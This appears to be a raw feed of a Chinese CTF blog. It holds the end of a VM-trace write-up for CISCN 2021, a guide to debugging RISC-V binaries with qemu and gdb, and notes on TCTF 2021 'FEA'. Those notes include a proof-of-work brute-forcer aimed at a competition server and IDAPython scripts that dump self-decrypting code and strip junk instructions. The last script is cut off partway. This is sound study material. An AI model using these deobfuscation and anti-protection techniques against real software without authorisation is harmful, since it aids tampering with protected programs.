class="string">452: inputchar+=1   3</span></span><br><span class="line"><span class="string">453: inputchar+=1   3</span></span><br><span class="line"><span class="string">454: inputchar+=1   3</span></span><br><span class="line"><span class="string">455: inputchar+=1   3</span></span><br><span class="line"><span class="string">456: inputchar+=1   3</span></span><br><span class="line"><span class="string">457: inputchar+=1   3</span></span><br><span class="line"><span class="string">458: inputchar+=1   3</span></span><br><span class="line"><span class="string">459: inputchar+=1   3</span></span><br><span class="line"><span class="string">460: inputchar+=1   3</span></span><br><span class="line"><span class="string">461: inputchar+=1   3</span></span><br><span class="line"><span class="string">462: inputchar+=1   3</span></span><br><span class="line"><span class="string">463: inputchar+=1   3</span></span><br><span class="line"><span class="string">464: inputchar index +1   4</span></span><br><span class="line"><span class="string">465: inputchar-=1   4</span></span><br><span class="line"><span class="string">466: if inputchar != 0 jump 451  4</span></span><br><span class="line"><span class="string">467: inputchar index -1   3</span></span><br><span class="line"><span class="string">468: inputchar+=1   3</span></span><br><span class="line"><span class="string">469: inputchar index +1   4</span></span><br><span class="line"><span class="string">470: inputchar index -1   3</span></span><br><span class="line"><span class="string">471: inputchar index -1   2</span></span><br><span class="line"><span class="string">472: inputchar index +1   3</span></span><br><span class="line"><span class="string">473: if inputchar == 0 jump 479  3</span></span><br><span class="line"><span class="string">474: inputchar index -1   2</span></span><br><span class="line"><span class="string">475: inputchar-=1   2</span></span><br><span class="line"><span class="string">476: inputchar index +1   3</span></span><br><span class="line"><span class="string">477: inputchar-=1   3</span></span><br><span class="line"><span class="string">478: if inputchar != 0 jump 474  3</span></span><br><span class="line"><span class="string">479: inputchar index -1   2</span></span><br><span class="line"><span class="string">480: if inputchar == 0 jump 531  2</span></span><br><span class="line"><span class="string">481: inputchar index +1   3</span></span><br><span class="line"><span class="string">482: inputchar index +1   4</span></span><br><span class="line"><span class="string">483: if inputchar == 0 jump 486  4</span></span><br><span class="line"><span class="string">484: inputchar-=1   4</span></span><br><span class="line"><span class="string">485: if inputchar != 0 jump 484  4</span></span><br><span class="line"><span class="string">486: inputchar index +1   5</span></span><br><span class="line"><span class="string">487: inputchar index -1   4</span></span><br><span class="line"><span class="string">488: inputchar index +1   5</span></span><br><span class="line"><span class="string">489: if inputchar == 0 jump 492  5</span></span><br><span class="line"><span class="string">490: inputchar-=1   5</span></span><br><span class="line"><span class="string">491: if inputchar != 0 jump 490  5</span></span><br><span class="line"><span class="string">492: inputchar index -1   4</span></span><br><span class="line"><span class="string">493: inputchar index -1   3</span></span><br><span class="line"><span class="string">494: inputchar index -1   2</span></span><br><span class="line"><span class="string">495: inputchar index -1   1</span></span><br><span class="line"><span class="string">496: if inputchar == 0 jump 499  1</span></span><br><span class="line"><span class="string">497: inputchar-=1   1</span></span><br><span class="line"><span class="string">498: if inputchar != 0 jump 497  1</span></span><br><span class="line"><span class="string">499: inputchar index +1   2</span></span><br><span class="line"><span class="string">500: inputchar index +1   3</span></span><br><span class="line"><span class="string">501: inputchar index +1   4</span></span><br><span class="line"><span class="string">502: if inputchar == 0 jump 515  4</span></span><br><span class="line"><span class="string">503: inputchar index +1   5</span></span><br><span class="line"><span class="string">504: inputchar+=1   5</span></span><br><span class="line"><span class="string">505: inputchar index -1   4</span></span><br><span class="line"><span class="string">506: inputchar index -1   3</span></span><br><span class="line"><span class="string">507: inputchar index -1   2</span></span><br><span class="line"><span class="string">508: inputchar index -1   1</span></span><br><span class="line"><span class="string">509: inputchar+=1   1</span></span><br><span class="line"><span class="string">510: inputchar index +1   2</span></span><br><span class="line"><span class="string">511: inputchar index +1   3</span></span><br><span class="line"><span class="string">512: inputchar index +1   4</span></span><br><span class="line"><span class="string">513: inputchar-=1   4</span></span><br><span class="line"><span class="string">514: if inputchar != 0 jump 503  4</span></span><br><span class="line"><span class="string">515: inputchar index +1   5</span></span><br><span class="line"><span class="string">516: if inputchar == 0 jump 522  5</span></span><br><span class="line"><span class="string">517: inputchar index -1   4</span></span><br><span class="line"><span class="string">518: inputchar+=1   4</span></span><br><span class="line"><span class="string">519: inputchar index +1   5</span></span><br><span class="line"><span class="string">520: inputchar-=1   5</span></span><br><span class="line"><span class="string">521: if inputchar != 0 jump 517  5</span></span><br><span class="line"><span class="string">522: inputchar index -1   4</span></span><br><span class="line"><span class="string">523: inputchar index +1   5</span></span><br><span class="line"><span class="string">524: inputchar index -1   4</span></span><br><span class="line"><span class="string">525: inputchar index -1   3</span></span><br><span class="line"><span class="string">526: inputchar index -1   2</span></span><br><span class="line"><span class="string">527: if inputchar == 0 jump 530  2</span></span><br><span class="line"><span class="string">528: inputchar-=1   2</span></span><br><span class="line"><span class="string">529: if inputchar != 0 jump 528  2</span></span><br><span class="line"><span class="string">530: if inputchar != 0 jump 481  2</span></span><br><span class="line"><span class="string">531: if inputchar == 0 jump 534  2</span></span><br><span class="line"><span class="string">532: inputchar-=1   2</span></span><br><span class="line"><span class="string">533: if inputchar != 0 jump 532  2</span></span><br><span class="line"><span class="string">534: inputchar index +1   3</span></span><br><span class="line"><span class="string">535: inputchar index -1   2</span></span><br><span class="line"><span class="string">536: input  2</span></span><br><span class="line"><span class="string">537: inputchar index +1   3</span></span><br><span class="line"><span class="string">538: if inputchar == 0 jump 541  3</span></span><br><span class="line"><span class="string">539: inputchar-=1   3</span></span><br><span class="line"><span class="string">540: if inputchar != 0 jump 539  3</span></span><br><span class="line"><span class="string">541: inputchar index +1   4</span></span><br><span class="line"><span class="string">542: if inputchar == 0 jump 545  4</span></span><br><span class="line"><span class="string">543: inputchar-=1   4</span></span><br><span class="line"><span class="string">544: if inputchar != 0 jump 543  4</span></span><br><span class="line"><span class="string">545: inputchar+=1   4</span></span><br><span class="line"><span class="string">546: inputchar+=1   4</span></span><br><span class="line"><span class="string">547: inputchar+=1   4</span></span><br><span class="line"><span class="string">548: inputchar+=1   4</span></span><br><span class="line"><span class="string">549: inputchar+=1   4</span></span><br><span class="line"><span class="string">550: if inputchar == 0 jump 566  4</span></span><br><span class="line"><span class="string">551: inputchar index -1   3</span></span><br><span class="line"><span class="string">552: inputchar+=1   3</span></span><br><span class="line"><span class="string">553: inputchar+=1   3</span></span><br><span class="line"><span class="string">554: inputchar+=1   3</span></span><br><span class="line"><span class="string">555: inputchar+=1   3</span></span><br><span class="line"><span class="string">556: inputchar+=1   3</span></span><br><span class="line"><span class="string">557: inputchar+=1   3</span></span><br><span class="line"><span class="string">558: inputchar+=1   3</span></span><br><span class="line"><span class="string">559: inputchar+=1   3</span></span><br><span class="line"><span class="string">560: inputchar+=1   3</span></span><br><span class="line"><span class="string">561: inputchar+=1   3</span></span><br><span class="line"><span class="string">562: inputchar+=1   3</span></span><br><span class="line"><span class="string">563: inputchar index +1   4</span></span><br><span class="line"><span class="string">564: inputchar-=1   4</span></span><br><span class="line"><span class="string">565: if inputchar != 0 jump 551  4</span></span><br><span class="line"><span class="string">566: inputchar index -1   3</span></span><br><span class="line"><span class="string">567: inputchar index +1   4</span></span><br><span class="line"><span class="string">568: inputchar index -1   3</span></span><br><span class="line"><span class="string">569: inputchar index -1   2</span></span><br><span class="line"><span class="string">570: inputchar index +1   3</span></span><br><span class="line"><span class="string">571: if inputchar == 0 jump 577  3</span></span><br><span class="line"><span class="string">572: inputchar index -1   2</span></span><br><span class="line"><span class="string">573: inputchar-=1   2</span></span><br><span class="line"><span class="string">574: inputchar index +1   3</span></span><br><span class="line"><span class="string">575: inputchar-=1   3</span></span><br><span class="line"><span class="string">576: if inputchar != 0 jump 572  3</span></span><br><span class="line"><span class="string">577: inputchar index -1   2</span></span><br><span class="line"><span class="string">578: if inputchar == 0 jump 629  2</span></span><br><span class="line"><span class="string">579: inputchar index +1   3</span></span><br><span class="line"><span class="string">580: inputchar index +1   4</span></span><br><span class="line"><span class="string">581: if inputchar == 0 jump 584  4</span></span><br><span class="line"><span class="string">582: inputchar-=1   4</span></span><br><span class="line"><span class="string">583: if inputchar != 0 jump 582  4</span></span><br><span class="line"><span class="string">584: inputchar index +1   5</span></span><br><span class="line"><span class="string">585: inputchar index -1   4</span></span><br><span class="line"><span class="string">586: inputchar index +1   5</span></span><br><span class="line"><span class="string">587: if inputchar == 0 jump 590  5</span></span><br><span class="line"><span class="string">588: inputchar-=1   5</span></span><br><span class="line"><span class="string">589: if inputchar != 0 jump 588  5</span></span><br><span class="line"><span class="string">590: inputchar index -1   4</span></span><br><span class="line"><span class="string">591: inputchar index -1   3</span></span><br><span class="line"><span class="string">592: inputchar index -1   2</span></span><br><span class="line"><span class="string">593: inputchar index -1   1</span></span><br><span class="line"><span class="string">594: if inputchar == 0 jump 597  1</span></span><br><span class="line"><span class="string">595: inputchar-=1   1</span></span><br><span class="line"><span class="string">596: if inputchar != 0 jump 595  1</span></span><br><span class="line"><span class="string">597: inputchar index +1   2</span></span><br><span class="line"><span class="string">598: inputchar index +1   3</span></span><br><span class="line"><span class="string">599: inputchar index +1   4</span></span><br><span class="line"><span class="string">600: if inputchar == 0 jump 613  4</span></span><br><span class="line"><span class="string">601: inputchar index +1   5</span></span><br><span class="line"><span class="string">602: inputchar+=1   5</span></span><br><span class="line"><span class="string">603: inputchar index -1   4</span></span><br><span class="line"><span class="string">604: inputchar index -1   3</span></span><br><span class="line"><span class="string">605: inputchar index -1   2</span></span><br><span class="line"><span class="string">606: inputchar index -1   1</span></span><br><span class="line"><span class="string">607: inputchar+=1   1</span></span><br><span class="line"><span class="string">608: inputchar index +1   2</span></span><br><span class="line"><span class="string">609: inputchar index +1   3</span></span><br><span class="line"><span class="string">610: inputchar index +1   4</span></span><br><span class="line"><span class="string">611: inputchar-=1   4</span></span><br><span class="line"><span class="string">612: if inputchar != 0 jump 601  4</span></span><br><span class="line"><span class="string">613: inputchar index +1   5</span></span><br><span class="line"><span class="string">614: if inputchar == 0 jump 620  5</span></span><br><span class="line"><span class="string">615: inputchar index -1   4</span></span><br><span class="line"><span class="string">616: inputchar+=1   4</span></span><br><span class="line"><span class="string">617: inputchar index +1   5</span></span><br><span class="line"><span class="string">618: inputchar-=1   5</span></span><br><span class="line"><span class="string">619: if inputchar != 0 jump 615  5</span></span><br><span class="line"><span class="string">620: inputchar index -1   4</span></span><br><span class="line"><span class="string">621: inputchar index +1   5</span></span><br><span class="line"><span class="string">622: inputchar index -1   4</span></span><br><span class="line"><span class="string">623: inputchar index -1   3</span></span><br><span class="line"><span class="string">624: inputchar index -1   2</span></span><br><span class="line"><span class="string">625: if inputchar == 0 jump 628  2</span></span><br><span class="line"><span class="string">626: inputchar-=1   2</span></span><br><span class="line"><span class="string">627: if inputchar != 0 jump 626  2</span></span><br><span class="line"><span class="string">628: if inputchar != 0 jump 579  2</span></span><br><span class="line"><span class="string">629: if inputchar == 0 jump 632  2</span></span><br><span class="line"><span class="string">630: inputchar-=1   2</span></span><br><span class="line"><span class="string">631: if inputchar != 0 jump 630  2</span></span><br><span class="line"><span class="string">632: inputchar index +1   3</span></span><br><span class="line"><span class="string">633: if inputchar == 0 jump 636  3</span></span><br><span class="line"><span class="string">634: inputchar-=1   3</span></span><br><span class="line"><span class="string">635: if inputchar != 0 jump 634  3</span></span><br><span class="line"><span class="string">636: inputchar index -1   2</span></span><br><span class="line"><span class="string">637: inputchar index -1   1</span></span><br><span class="line"><span class="string">638: if inputchar == 0 jump 647  1</span></span><br><span class="line"><span class="string">639: inputchar index +1   2</span></span><br><span class="line"><span class="string">640: inputchar+=1   2</span></span><br><span class="line"><span class="string">641: inputchar index +1   3</span></span><br><span class="line"><span class="string">642: inputchar+=1   3</span></span><br><span class="line"><span class="string">643: inputchar index -1   2</span></span><br><span class="line"><span class="string">644: inputchar index -1   1</span></span><br><span class="line"><span class="string">645: inputchar-=1   1</span></span><br><span class="line"><span class="string">646: if inputchar != 0 jump 639  1</span></span><br><span class="line"><span class="string">647: inputchar index +1   2</span></span><br><span class="line"><span class="string">648: inputchar index +1   3</span></span><br><span class="line"><span class="string">649: if inputchar == 0 jump 657  3</span></span><br><span class="line"><span class="string">650: inputchar index -1   2</span></span><br><span class="line"><span class="string">651: inputchar index -1   1</span></span><br><span class="line"><span class="string">652: inputchar+=1   1</span></span><br><span class="line"><span class="string">653: inputchar index +1   2</span></span><br><span class="line"><span class="string">654: inputchar index +1   3</span></span><br><span class="line"><span class="string">655: inputchar-=1   3</span></span><br><span class="line"><span class="string">656: if inputchar != 0 jump 650  3</span></span><br><span class="line"><span class="string">657: inputchar index -1   2</span></span><br><span class="line"><span class="string">658: if inputchar == 0 jump 707  2</span></span><br><span class="line"><span class="string">659: inputchar index +1   3</span></span><br><span class="line"><span class="string">660: inputchar index +1   4</span></span><br><span class="line"><span class="string">661: if inputchar == 0 jump 664  4</span></span><br><span class="line"><span class="string">662: inputchar-=1   4</span></span><br><span class="line"><span class="string">663: if inputchar != 0 jump 662  4</span></span><br><span class="line"><span class="string">664: inputchar index +1   5</span></span><br><span class="line"><span class="string">665: if inputchar == 0 jump 668  5</span></span><br><span class="line"><span class="string">666: inputchar-=1   5</span></span><br><span class="line"><span class="string">667: if inputchar != 0 jump 666  5</span></span><br><span class="line"><span class="string">668: inputchar index -1   4</span></span><br><span class="line"><span class="string">669: inputchar index +1   5</span></span><br><span class="line"><span class="string">670: inputchar+=1   5</span></span><br><span class="line"><span class="string">671: inputchar+=1   5</span></span><br><span class="line"><span class="string">672: inputchar+=1   5</span></span><br><span class="line"><span class="string">673: inputchar+=1   5</span></span><br><span class="line"><span class="string">674: inputchar+=1   5</span></span><br><span class="line"><span class="string">675: inputchar+=1   5</span></span><br><span class="line"><span class="string">676: inputchar+=1   5</span></span><br><span class="line"><span class="string">677: inputchar+=1   5</span></span><br><span class="line"><span class="string">678: if inputchar == 0 jump 693  5</span></span><br><span class="line"><span class="string">679: inputchar index -1   4</span></span><br><span class="line"><span class="string">680: inputchar+=1   4</span></span><br><span class="line"><span class="string">681: inputchar+=1   4</span></span><br><span class="line"><span class="string">682: inputchar+=1   4</span></span><br><span class="line"><span class="string">683: inputchar+=1   4</span></span><br><span class="line"><span class="string">684: inputchar+=1   4</span></span><br><span class="line"><span class="string">685: inputchar+=1   4</span></span><br><span class="line"><span class="string">686: inputchar+=1   4</span></span><br><span class="line"><span class="string">687: inputchar+=1   4</span></span><br><span class="line"><span class="string">688: inputchar+=1   4</span></span><br><span class="line"><span class="string">689: inputchar+=1   4</span></span><br><span class="line"><span class="string">690: inputchar index +1   5</span></span><br><span class="line"><span class="string">691: inputchar-=1   5</span></span><br><span class="line"><span class="string">692: if inputchar != 0 jump 679  5</span></span><br><span class="line"><span class="string">693: inputchar index -1   4</span></span><br><span class="line"><span class="string">694: inputchar-=1   4</span></span><br><span class="line"><span class="string">695: 696: inputchar-=1   4</span></span><br><span class="line"><span class="string">697: inputchar-=1   4</span></span><br><span class="line"><span class="string">698: inputchar-=1   4</span></span><br><span class="line"><span class="string">699: inputchar-=1   4</span></span><br><span class="line"><span class="string">700: 701: inputchar index -1   3</span></span><br><span class="line"><span class="string">702: inputchar index -1   2</span></span><br><span class="line"><span class="string">703: if inputchar == 0 jump 706  2</span></span><br><span class="line"><span class="string">704: inputchar-=1   2</span></span><br><span class="line"><span class="string">705: if inputchar != 0 jump 704  2</span></span><br><span class="line"><span class="string">706: if inputchar != 0 jump 659  2</span></span><br><span class="line"><span class="string">707: inputchar index -1   1</span></span><br><span class="line"><span class="string">708: inputchar index -1   0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>每次输入放入 2 位置，与 3、4位置的计算结果比较</p><img src="/2021/07/19/CISCN2021-little-evil/little_evil2.png" class="">]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;国赛题复现&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
    <category term="ruby" scheme="https://www.0wl.site/tags/ruby/"/>
    
  </entry>
  
  <entry>
    <title>riscv架构的gdb调试</title>
    <link href="https://www.0wl.site/2021/07/16/riscv%E6%9E%B6%E6%9E%84%E7%9A%84gdb%E8%B0%83%E8%AF%95/"/>
    <id>https://www.0wl.site/2021/07/16/riscv%E6%9E%B6%E6%9E%84%E7%9A%84gdb%E8%B0%83%E8%AF%95/</id>
    <published>2021-07-16T07:28:45.000Z</published>
    <updated>2021-07-16T08:58:02.237Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>有些逆向题会有riscv架构的，总结一下如何利用 qemu 和 gdb 调试 riscv 架构的程序</p></div></article><span id="more"></span><p>​        riscv 架构的不能用 ida 反编译，但是 ghidra 可以</p><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><p>​        调试 riscv 架构的程序需要准备专用的 gdb ，<a href="https://xpack.github.io/riscv-none-embed-gcc/releases/">https://xpack.github.io/riscv-none-embed-gcc/releases/</a>  这里面包含各种开发工具，gdb 、gcc 、objdump……（ubuntu 的 gdb-multiarch 不支持 riscv 架构，但是其他一些系统可以）</p><p>​        下载完后解压，进入到 bin 目录下就可以使用 gdb</p><p>​        qemu 的话直接在官网下载</p><p>​        如果安装的 qemu 找不到 riscv 可以参考下这个来安装 <a href="https://pdos.csail.mit.edu/6.828/2019/tools.html">https://pdos.csail.mit.edu/6.828/2019/tools.html</a></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>​        <code>qemu-riscv64 -g 2334 &#39;/home/owl/桌面/main&#39; </code>  -g 开放调试端口</p><p>​        <code>./riscv-none-embed-gdb</code> </p><p>​        开启 gdb 后输入如下命令</p><p>​        <code>target remote :2334</code> </p><p>​        <code>file ./main</code></p><p>​        只能用原版 gdb ，gdb 插件会出错</p><h3 id="调试时的一些指令"><a href="#调试时的一些指令" class="headerlink" title="调试时的一些指令"></a>调试时的一些指令</h3><p>​        <code>x /10xi 0x1234</code>：查看对应的反汇编代码</p><p>​        <code>info registers</code> ：查看寄存器</p><p>​        <code>x /14xb 0x1234</code>：查看内存</p><p>​        <code>stepi</code> ：单步执行</p>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;有些逆向题会有riscv架构的，总结一下如何利用 qemu 和 gdb 调试 riscv 架构的程序&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="riscv" scheme="https://www.0wl.site/tags/riscv/"/>
    
    <category term="gdb" scheme="https://www.0wl.site/tags/gdb/"/>
    
    <category term="qemu" scheme="https://www.0wl.site/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>tctf2021 FEA</title>
    <link href="https://www.0wl.site/2021/07/07/tctf2021-FEA/"/>
    <id>https://www.0wl.site/2021/07/07/tctf2021-FEA/</id>
    <published>2021-07-07T12:38:50.000Z</published>
    <updated>2021-11-16T14:56:58.589Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>不算 wp，只是记录一下从这题中学习到的知识</p></div></article><span id="more"></span><h2 id="爆破-sha256"><a href="#爆破-sha256" class="headerlink" title="爆破 sha256"></a>爆破 sha256</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">r=remote(<span class="string">&quot;111.186.58.164&quot;</span>,<span class="number">30212</span>)</span><br><span class="line">proof_of_work_line = r.recvline(keepends=<span class="literal">False</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">enc = re.search(<span class="string">&#x27;== (.*)&#x27;</span>,proof_of_work_line).group(<span class="number">1</span>)</span><br><span class="line">strlist=itertools.product(string.ascii_letters+string.digits,repeat=<span class="number">4</span>)</span><br><span class="line">code=<span class="string">&quot;&quot;</span></span><br><span class="line">key=<span class="string">&quot;hUsUzJ47UdPwwTns&quot;</span></span><br><span class="line">enc=<span class="string">&quot;ac2b009cf8ab722c6417f0dff94a24434a7d7c43f12da21a042faa34295efe22&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    code=i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    encinfo=hashlib.sha256(<span class="built_in">str</span>(code+key).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> encinfo == enc:</span><br><span class="line">        <span class="built_in">print</span>(code)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     </span><br></pre></td></tr></table></figure><h3 id="itertools-的简单用法"><a href="#itertools-的简单用法" class="headerlink" title="itertools 的简单用法"></a>itertools 的简单用法</h3><p><strong>1.itertools.product(‘ABCD’, repeat = 2)   排列组合（笛卡尔积）</strong> </p><p>​    <strong>结果：AA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DD</strong></p><p>​    <strong>也可以是两个元组排列组合</strong></p><p><strong>2.itertools.permutations(‘ABCD’, 2)     所有可能的排列，无重复元素</strong></p><p>​    <strong>结果：AB AC AD BA BC BD CA CB CD DA DB DC</strong></p><p><strong>3.itertools.combinations(‘ABCD’, 2)      有序，无重复元素</strong></p><p>​    <strong>结果：AB AC AD BC BD CD</strong></p><p><strong>4.itertools.combinations_with_replacement(‘ABCD’, 2)        有序，元素可重复</strong></p><p>​    <strong>结果：AA AB AC AD BB BC BD CC CD DD</strong></p><h2 id="用插件去除-ollvm-混淆"><a href="#用插件去除-ollvm-混淆" class="headerlink" title="用插件去除 ollvm 混淆"></a>用插件去除 ollvm 混淆</h2><p>​    插件介绍：<a href="https://eshard.com/posts/d810_blog_post_1/">https://eshard.com/posts/d810_blog_post_1/</a></p><p>​    下载地址：<a href="https://gitlab.com/eshard/d810">https://gitlab.com/eshard/d810</a></p><p>​    这个插件提供多个 rules 来反混淆，也可以自己<strong>添加规则</strong>。在这题中使用了对控制流的混淆，勾选这一选项就可以实现反混淆</p><img src="/2021/07/07/tctf2021-FEA/D810.png" class=""><h3 id="使用前后对比"><a href="#使用前后对比" class="headerlink" title="使用前后对比"></a>使用前后对比</h3><p>​    <img src="/2021/07/07/tctf2021-FEA/before.png" class=""></p><p>​    <img src="/2021/07/07/tctf2021-FEA/after.png" class=""></p><h2 id="用idaPython去除花指令"><a href="#用idaPython去除花指令" class="headerlink" title="用idaPython去除花指令"></a>用idaPython去除花指令</h2><img src="/2021/07/07/tctf2021-FEA/smc.png" class=""><p>​    从简化后的流程看可以知道有两处反调试，还有一处 smc 自解密</p><img src="/2021/07/07/tctf2021-FEA/result.png" class=""><p>​    smc 后 [rbp+s] 指向解密后的代码，因为代码比较长就用脚本提取出来分析</p><h3 id="一些-idapython-函数"><a href="#一些-idapython-函数" class="headerlink" title="一些 idapython 函数"></a>一些 idapython 函数</h3><p><strong>idaapi:</strong></p><p>​    <strong>BADADDR：4294967295   地址上界</strong></p><p>​    <strong>del_items(ea, flags=0, nbytes=1, may_destroy=None)：Convert item (instruction/data) to unexplored bytes</strong></p><p>​    <strong>create_insn(ea, out=None)：Create an instruction at the specified address</strong></p><p>​    <strong>get_first_cref_from(frm)：Get first instruction referenced from the specified instruction</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#提取 smc 的代码</span></span><br><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line">start=<span class="number">0x00007F96D2BBB000</span></span><br><span class="line">count = <span class="number">0x100000</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;C:\\Users\\chz\\Desktop\\smc&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,count):</span><br><span class="line">    f.write(get_byte(start+i).to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br></pre></td></tr></table></figure><p>​    ida 分析后有一大堆花指令，手动分析时间太久考虑用脚本去除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#写了一半的去除部分跳转花指令，自动变code脚本</span></span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undefine</span>(<span class="params">start,end</span>):</span></span><br><span class="line">    curr=start</span><br><span class="line">    <span class="keyword">while</span> curr != idaapi.BADADDR <span class="keyword">and</span> curr &lt; end:</span><br><span class="line">        idaapi.del_items(curr, <span class="number">8</span>)</span><br><span class="line">        curr=curr+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_code</span>(<span class="params">start,end</span>):</span></span><br><span class="line">    curr=start</span><br><span class="line">    <span class="keyword">while</span> curr != idaapi.BADADDR <span class="keyword">and</span> curr &lt; end:</span><br><span class="line">        insn = idaapi.insn_t()</span><br><span class="line">        ret = idaapi.create_insn(curr, insn)</span><br><span class="line">        <span class="keyword">if</span> ret == <span class="number">0</span>:</span><br><span class="line">            idaapi.del_items(curr, <span class="number">8</span>)</span><br><span class="line">            idaapi.del_items(curr+<span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line">            ret = idaapi.create_insn(curr, insn)</span><br><span class="line">            </span><br><span class="line">        next_ea = idaapi.get_first_cref_from(curr)</span><br><span class="line">        <span class="keyword">if</span> (curr&lt;end <span class="keyword">and</span> next_ea == BADADDR) <span class="keyword">or</span> curr==<span class="number">0xbf6a</span> <span class="keyword">or</span> curr==<span class="number">0x17A6F</span>:</span><br><span class="line">            curr = curr+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            curr=next_ea</span><br><span class="line">        <span class="built_in">print</span>(curr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span>(<span class="params">start,end</span>):</span></span><br><span class="line">    curr=start</span><br><span class="line">    <span class="keyword">while</span> curr != idaapi.BADADDR <span class="keyword">and</span> curr &lt; end:</span><br><span class="line">        insn = idaapi.insn_t()</span><br><span class="line">        <span class="keyword">if</span> idc.GetDisasm(curr)[<span class="number">0</span>:<span class="number">1</span>]==<span class="string">&#x27;j&#x27;</span> <span class="keyword">or</span> idc.GetDisasm(curr)[<span class="number">0</span>:<span class="number">4</span>]==<span class="string">&#x27;call&#x27;</span>:    <span class="comment">#特定地址反汇编</span></span><br><span class="line">            jmp_addr=idc.GetOperandValue(curr,<span class="number">0</span>) <span class="comment">#获取操作数</span></span><br><span class="line">            ret = idaapi.create_insn(jmp_addr, insn)  </span><br><span class="line">            <span class="keyword">if</span> ret == <span class="number">0</span>:</span><br><span class="line">                idaapi.del_items(jmp_addr, <span class="number">8</span>)</span><br><span class="line">                idaapi.del_items(jmp_addr+<span class="number">2</span>, <span class="number">8</span>)</span><br><span class="line">                idaapi.del_items(jmp_addr+<span class="number">4</span>, <span class="number">8</span>)</span><br><span class="line">                ret = idaapi.create_insn(curr, insn)          </span><br><span class="line">        next_ea = idaapi.get_first_cref_from(curr)</span><br><span class="line">        <span class="keyword">if</span> (curr&lt;end <span class="keyword">and</span> next_ea == BADADDR) <span class="keyword">or</span> curr==<span class="number">0xbf6a</span> <span class="keyword">or</span> curr==<span 